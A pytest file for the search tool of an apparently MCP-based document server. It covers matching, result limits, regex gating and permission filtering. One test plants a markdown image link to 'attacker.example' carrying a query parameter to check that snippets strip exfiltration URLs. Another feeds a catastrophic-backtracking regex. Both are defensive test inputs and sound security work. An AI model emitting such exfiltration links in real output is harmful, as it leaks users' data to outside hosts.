import pytest
from fastmcp.exceptions import ToolError

from arrowhead.authz.enforce import get_authorizer
from arrowhead.config import get_settings
from arrowhead.tools.doc_search import doc_search


async def test_finds_matches_across_corpus(docs):
    (docs / "a.txt").write_text("the deadline is friday")
    (docs / "b.md").write_text("no match here")
    (docs / "c.txt").write_text("another deadline looms")
    result = await doc_search("deadline")
    assert result["match_count"] == 2
    paths = {match["path"] for match in result["matches"]}
    assert paths == {"a.txt", "c.txt"}


async def test_snippet_exfiltration_neutralized(docs):
    (docs / "note.md").write_text("![x](http://attacker.example/?s=1) deadline")
    result = await doc_search("deadline")
    snippet = result["matches"][0]["snippet"]
    assert "attacker.example" not in snippet


async def test_results_are_bounded(docs, monkeypatch):
    monkeypatch.setenv("ARROWHEAD_SEARCH_MAX_RESULTS", "2")
    get_settings.cache_clear()
    for i in range(5):
        (docs / f"f{i}.txt").write_text("match")
    result = await doc_search("match")
    assert result["match_count"] == 2
    assert result["truncated"] is True


async def test_empty_query_rejected(docs):
    with pytest.raises(ToolError):
        await doc_search("   ")


async def test_regex_disabled_by_default(docs):
    (docs / "a.txt").write_text("abc123")
    with pytest.raises(ToolError):
        await doc_search(r"\d+", use_regex=True)


async def test_regex_enabled_matches(docs, monkeypatch):
    monkeypatch.setenv("ARROWHEAD_SEARCH_REGEX_ENABLED", "true")
    get_settings.cache_clear()
    (docs / "a.txt").write_text("order 4271 shipped")
    result = await doc_search(r"\d{4}", use_regex=True)
    assert result["match_count"] == 1


async def test_catastrophic_regex_does_not_hang(docs, monkeypatch):
    monkeypatch.setenv("ARROWHEAD_SEARCH_REGEX_ENABLED", "true")
    get_settings.cache_clear()
    (docs / "a.txt").write_text("a" * 200 + "!")
    # Either completes quickly or is aborted cleanly, never hangs.
    result = await doc_search(r"(a+)+$", use_regex=True)
    assert "match_count" in result


async def test_search_filters_unreadable_documents(docs, monkeypatch):
    monkeypatch.setenv("ARROWHEAD_AUTH_ENABLED", "true")
    monkeypatch.setenv(
        "ARROWHEAD_AUTHZ_POLICY",
        '{"grants": [{"subject": "*", "actions": ["search", "read"], '
        '"prefix": "public/"}]}',
    )
    get_settings.cache_clear()
    get_authorizer.cache_clear()
    (docs / "public").mkdir()
    (docs / "public" / "ok.txt").write_text("deadline in public")
    (docs / "secret.txt").write_text("deadline in secret")

    result = await doc_search("deadline")
    paths = {match["path"] for match in result["matches"]}
    assert paths == {"public/ok.txt"}
